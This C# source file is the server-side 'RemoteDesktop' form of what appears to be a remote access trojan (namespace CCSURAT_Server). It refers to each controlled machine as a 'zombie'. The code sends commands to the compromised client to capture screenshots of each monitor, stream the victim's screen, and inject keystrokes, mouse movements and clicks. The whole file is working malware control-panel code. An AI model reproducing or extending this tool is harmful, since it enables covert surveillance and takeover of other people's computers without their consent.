using System;
using System.Drawing;
using System.Threading;
using System.Windows.Forms;

namespace CCSURAT_Server
{
    public partial class RemoteDesktop  : Form
    {
        private Zombie zombie;
        private static object screenImageLock = new object();
        private DateTime lastSentMovement;

        public RemoteDesktop(Zombie zombie)
        {
            InitializeComponent();
            this.zombie = zombie;
            this.Text = zombie.IP + " - " + zombie.computerName + " - Remote Desktop";
        }

        private void singleToolStripMenuItem_Click(object sender, EventArgs e)
        {
            GetScreenImage(monitorList.SelectedIndex);
        }

        private void RemoteDesktop_Load(object sender, EventArgs e)
        {
            // Set textboxes to the trackbar values
            refreshTextbox.Text = refreshInterval.Value + " ms";
            qualityTextbox.Text = imageQuality.Value + "%";
            sizeTextbox.Text = imageSize.Value + "%";

            // Set the refresh time interval to refresh trackbar value
            refreshTimer.Interval = refreshInterval.Value;
        }

        private void GetScreenImage(int monitorIndex)
        {
            if (monitorList.Text != string.Empty)
            {
                try
                {
                    // Screenshot is made client-side, then transferred to server.
                    // Screenshot binary data is processed and then placed into the client object.
                    MakeScreenshot();

                    // Attempt to stop frame freezing, works, but the "Single" frame button doesn't
                    // produce most recent image after running a video "stream".
                    lock(screenImageLock)
                    {
                        new Thread(() =>
                        {
                            while (zombie.monitors[monitorIndex].getScreenImage() == null)
                            {
                                Thread.Sleep(1);
                                Application.DoEvents();
                            }
                            screenImageBox.Image = zombie.monitors[monitorIndex].getScreenImage();
                            zombie.monitors[monitorIndex].setScreenImage(null);
                        }).Start();
                    }
                }
                catch (Exception ex)
                {
                    Console.WriteLine("Get screen image error: " + ex.ToString());
                }
            }
        }

        private void MakeScreenshot()
        {
            // Request a screenshot passing the image quality value, the image resize value and the device name. 
            zombie.SendData("[[SCREENSHOT]]" + imageQuality.Value + "|*|" +
                          Convert.ToDouble(imageSize.Value) / 100 + "|*|" + 
                                                 monitorList.Text + "[[/SCREENSHOT]]");
        }

        private void GetMonitors()
        {
            try
            {
                // Clear monitors list and get all client's monitors.
                zombie.SendData("[[MONITORS]][[/MONITORS]]");
                while (zombie.monitors.Count <= 0)
                {
                    System.Threading.Thread.Sleep(1);
                    Application.DoEvents();
                }
                // For each monitor that was returned, add it to the monitor list.
                foreach (ControlClasses.Monitor m in zombie.monitors)
                    monitorList.Items.Add(m.deviceName());

                // Set selected monitor to the first monitor. I think this would be the primary one.
                monitorList.SelectedIndex = 0;
            }
            catch (Exception ex)
            {
            }
        }

        private void startToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (monitorList.Text != string.Empty)
            {
                monitorList.Enabled = false;
                refreshTimer.Start();
            }
            ActiveControl = screenImageBox;
        }

        private void stopToolStripMenuItem_Click(object sender, EventArgs e)
        {
            refreshTimer.Stop();
            monitorList.Enabled = true;
        }

        private void refreshInterval_Scroll(object sender, EventArgs e)
        {
            refreshTextbox.Text = refreshInterval.Value + " ms";
            refreshTimer.Interval = refreshInterval.Value;
        }

        private void imageQuality_Scroll(object sender, EventArgs e)
        {
            qualityTextbox.Text = imageQuality.Value + "%"; 
        }

        private void refreshTimer_Tick(object sender, EventArgs e)
        {
            GetScreenImage(monitorList.SelectedIndex);
        }

        private void trackBar1_Scroll(object sender, EventArgs e)
        {
            sizeTextbox.Text = imageSize.Value + "%";
        }

        private void RemoteDesktop_Shown(object sender, EventArgs e)
        {
            GetMonitors();
        }

        private void pictureBox1_Click(object sender, EventArgs e)
        {

        }

        private void RemoteDesktop_KeyDown(object sender, KeyEventArgs e)
        {
            if (keyboardControlCheckbox.Checked)
            {
                zombie.SendData("[[KEYPRESS]]" + e.KeyCode.GetHashCode() + "|*|" + "Down" + "[[/KEYPRESS]]");
            }
        }

        private void RemoteDesktop_KeyUp(object sender, KeyEventArgs e)
        {
            if (keyboardControlCheckbox.Checked)
            {
                zombie.SendData("[[KEYPRESS]]" + e.KeyCode.GetHashCode() + "|*|" + "Up" + "[[/KEYPRESS]]");
            }
        }

        private void screenImageBox_MouseMove(object sender, MouseEventArgs e)
        {
            if (mouseControlCheckbox.Checked && (lastSentMovement == null || DateTime.Now > lastSentMovement.AddSeconds(1)))
            {
                MouseEventArgs mouse = (MouseEventArgs)e;

                Point movePoint = remoteMouseLoc(mouse.X, mouse.Y);

                // Send click command at X/Y and the mouse button name.
                zombie.SendData("[[MOUSEMOVE]]" + movePoint.X + "|*|" + movePoint.Y + "[[/MOUSEMOVE]]");
                lastSentMovement = DateTime.Now;
            }
        }

        private Point remoteMouseLoc(int x, int y)
        {
            // Calculate the screen mouse move point in relation to the picturebox click point.
            double monitorWidth = zombie.monitors[monitorList.SelectedIndex].getWidth();
            double monitorHeight = zombie.monitors[monitorList.SelectedIndex].getHeight();
            double monitorX = zombie.monitors[monitorList.SelectedIndex].getX();
            double monitorY = zombie.monitors[monitorList.SelectedIndex].getY();

            decimal factorX = (decimal)monitorWidth / screenImageBox.Size.Width;
            decimal factorY = (decimal)monitorHeight / screenImageBox.Size.Height;

            long mouseX = Convert.ToInt64(x * factorX + (decimal)monitorX);
            long mouseY = Convert.ToInt64(y * factorY + (decimal)monitorY);

            return new Point((int)mouseX, (int)mouseY);
        }

        private void mouseControlCheckbox_CheckedChanged(object sender, EventArgs e)
        {
            ActiveControl = screenImageBox;
        }

        private void keyboardControlCheckbox_CheckedChanged(object sender, EventArgs e)
        {
            ActiveControl = screenImageBox;
        }

        private void screenImageBox_MouseDown(object sender, MouseEventArgs e)
        {
            if (mouseControlCheckbox.Checked)
            {
                MouseEventArgs mouse = (MouseEventArgs)e;

                Point clickPoint = remoteMouseLoc(mouse.X, mouse.Y);

                // Send click command at X/Y and the mouse button name.
                zombie.SendData("[[MOUSECLICK]]" + clickPoint.X + "|*|" + clickPoint.Y + "|*|" + mouse.Button.ToString() + "|*|" + "Down" + "[[/MOUSECLICK]]");
            }
        }

        private void screenImageBox_MouseUp(object sender, MouseEventArgs e)
        {
            if (mouseControlCheckbox.Checked)
            {
                MouseEventArgs mouse = (MouseEventArgs)e;

                Point clickPoint = remoteMouseLoc(mouse.X, mouse.Y);

                // Send click command at X/Y and the mouse button name.
                zombie.SendData("[[MOUSECLICK]]" + clickPoint.X + "|*|" + clickPoint.Y + "|*|" + mouse.Button.ToString() + "|*|" + "Up" + "[[/MOUSECLICK]]");
            }
        }
    }
}
